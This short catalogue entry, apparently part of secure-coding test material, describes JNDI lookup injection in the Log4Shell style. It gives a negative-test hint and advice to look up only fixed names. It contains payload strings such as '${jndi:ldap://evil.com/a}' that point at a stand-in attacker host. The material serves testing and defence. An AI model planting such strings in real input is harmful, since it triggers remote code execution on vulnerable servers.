name: JNDI lookup injection (Log4Shell-style)
attack_scenario: Attacker supplies ldap://evil.com/a (or embeds ${jndi:ldap://evil.com/a} in logged input); the JVM fetches and instantiates the attacker's remote class, executing code.
negative_test_hint: log or look up the string "${jndi:ldap://evil.example.com/a}" and assert no outbound LDAP/RMI connection is attempted and the input is treated as data

exemplar.explanation: A JNDI lookup on an attacker-controlled name (or a ${jndi:...} interpolation reaching a lookup, as in Log4Shell) lets the attacker point at a remote LDAP/RMI URL that returns a malicious object, yielding remote code execution. Only ever look up fixed, developer-defined literal names such as 'java:comp/env/jdbc/AppDS', never user-supplied input.
